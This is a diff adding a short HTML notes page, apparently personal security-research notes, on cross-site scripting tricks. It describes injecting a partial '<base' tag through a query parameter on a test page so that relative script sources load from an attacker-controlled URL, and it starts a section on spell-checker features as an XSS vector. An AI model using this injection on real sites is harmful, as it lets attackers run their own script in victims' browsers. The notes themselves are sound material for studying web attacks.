@@ -1,0 +1,28 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Tricks</title>
+</head><body><b>Element Hijacking</b><br/>
+Consider source:<br/>
+&lt;!DOCTYPE html&gt;<br/>
+&lt;body&gt;<br/>
+&lt;a href="http://0.0.0.0/?q=brute"&gt;link&lt;/a&gt;<br/>
+&lt;script src="js/script.js"&gt;&lt;/script&gt;<br/>
+&lt;/body&gt;<br/>
+&lt;/html&gt;<br/>
+<br/>
+Try: http://brutelogic.com.br/tests/short.php?q=&lt;base<br/>
+This inserts a '&lt;base' tag to take over the &lt;a href&gt; link and sets the base URL to something we control<br/>
+&lt;!DOCTYPE html&gt;<br/>
+&lt;body&gt;<br/>
+&lt;base<br/>
+&lt;a href="http://0.0.0.0/?q=&lt;base"&gt;link&lt;/a&gt;<br/>
+&lt;script src="js/script.js"&gt;&lt;/script&gt;<br/>
+&lt;/body&gt;<br/>
+&lt;/html&gt;<br/>
+<br/>
+Then you just need to setup a response on your controlled URL<br/>
+<br/>
+<b>Spell Checker</b><br/>
+Some sites offer spell checking as a feature of their search functionality or translation application. While this might be a good idea from an user perspective, it can also be a bad idea for one who is trying to avoid XSS in his/her code. Developer got a “but report”.</body></html>
